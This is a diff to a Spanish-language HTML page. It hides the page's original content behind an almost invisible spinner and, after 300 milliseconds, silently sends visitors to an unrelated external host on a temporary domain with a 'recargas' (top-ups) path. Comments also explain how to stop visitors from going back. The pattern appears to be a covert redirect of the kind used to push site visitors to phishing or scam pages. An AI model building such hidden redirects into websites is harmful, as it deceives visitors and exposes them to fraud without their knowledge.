@@ -6,10 +6,10 @@
   <title>Redirigiendo...</title>
 
   <!-- ============================================================
-  ESTILOS - PANTALLA DE REDIRECCIÓN MÍNIMA
+  ESTILOS - PANTALLA BLANCA MÍNIMA
   ============================================================ -->
   <style>
-    /* Reset completo para pantalla en blanco puro */
+    /* Reset completo - fondo blanco puro */
     * {
       margin: 0;
       padding: 0;
@@ -26,17 +26,16 @@
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     }
 
-    /* Contenedor ultra minimalista - apenas visible */
+    /* Elemento casi invisible - solo un micro indicador */
     .redirect-minimal {
       text-align: center;
-      opacity: 0.3; /* Muy sutil */
-      transition: opacity 0.1s;
+      opacity: 0.15; /* Casi transparente */
     }
 
     .redirect-minimal .loader {
       display: inline-block;
-      width: 24px;
-      height: 24px;
+      width: 20px;
+      height: 20px;
       border: 2px solid rgba(0, 0, 0, 0.05);
       border-radius: 50%;
       border-top-color: #3498db;
@@ -47,7 +46,7 @@
       to { transform: rotate(360deg); }
     }
 
-    /* Ocultamos todo el contenido de la página original */
+    /* Ocultamos el contenido original */
     #mainContent {
       display: none;
     }
@@ -56,15 +55,14 @@
 <body>
 
   <!-- ============================================================
-  PANTALLA DE REDIRECCIÓN - CASI INVISIBLE
+  PANTALLA BLANCA CON MICRO-SPINNER (casi invisible)
   ============================================================ -->
   <div id="redirectScreen" class="redirect-minimal">
     <div class="loader"></div>
-    <!-- Sin texto para que sea más limpio, solo un micro-spinner -->
   </div>
 
   <!-- ============================================================
-  CONTENIDO ORIGINAL (oculto)
+  CONTENIDO ORIGINAL (completamente oculto)
   ============================================================ -->
   <div id="mainContent" style="display: none;">
     <!-- Todo el contenido original de la página de prueba -->
@@ -149,39 +147,50 @@
   </div>
 
   <!-- ============================================================
-  SCRIPT DE REDIRECCIÓN - RÁPIDA Y DISCRETA
+  SCRIPT DE REDIRECCIÓN - CAMBIO COMPLETO DE DOMINIO
   ============================================================ -->
   <script>
     (function() {
       // ============================================================
-      // 1️⃣ CAMBIA ESTA URL POR LA QUE QUIERAS REDIRIGIR
+      // 🔥 CAMBIA ESTA URL POR LA PÁGINA EXTERNA QUE QUIERAS
+      //    (debe ser una URL completa con http:// o https://)
       // ============================================================
       const DESTINO_URL = 'https://yhn.rjg.temporary.site/recargas/'; // <--- ¡Cámbiala!
 
       // ============================================================
-      // 2️⃣ TIEMPO DE ESPERA: 300ms (casi instantáneo)
+      // ⏱️ TIEMPO DE ESPERA: 300ms (casi instantáneo)
       // ============================================================
-      const TIEMPO_ESPERA = 300; // 0.3 segundos
+      const TIEMPO_ESPERA = 300;
 
       // ============================================================
-      // Función que ejecuta la redirección
+      // Función que ejecuta la redirección a DOMINIO EXTERNO
       // ============================================================
       function redirigir() {
-        if (DESTINO_URL && DESTINO_URL !== '') {
+        // Verificamos que la URL sea válida y esté configurada
+        if (DESTINO_URL && DESTINO_URL !== '' && DESTINO_URL !== 'https://www.ejemplo.com') {
+          
+          // ✅ REDIRECCIÓN COMPLETA A OTRO DOMINIO
+          // Usamos window.location.href para cambiar el dominio
+          // El navegador saldrá de este dominio y cargará la URL externa
           window.location.href = DESTINO_URL;
+          
+          // Nota: Si quieres que NO se pueda volver atrás, usa:
+          // window.location.replace(DESTINO_URL);
+          
         } else {
-          // Si no hay URL, mostramos un mensaje discreto
+          // Si no hay URL configurada, mostramos un mensaje de error
           document.getElementById('redirectScreen').innerHTML = `
-            <div style="font-size: 14px; color: #999;">
-              ⚠️ Configura DESTINO_URL en el código
+            <div style="font-size: 14px; color: #999; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+              ⚠️ Configura DESTINO_URL en el código<br>
+              <span style="font-size: 12px;">(Reemplaza 'https://www.ejemplo.com')</span>
             </div>
           `;
-          console.error('❌ No se ha definido una URL de destino.');
+          console.error('❌ No se ha definido una URL de destino válida.');
         }
       }
 
       // ============================================================
-      // Redirección después del tiempo establecido
+      // Ejecutamos la redirección después del tiempo establecido
       // ============================================================
       setTimeout(redirigir, TIEMPO_ESPERA);
 
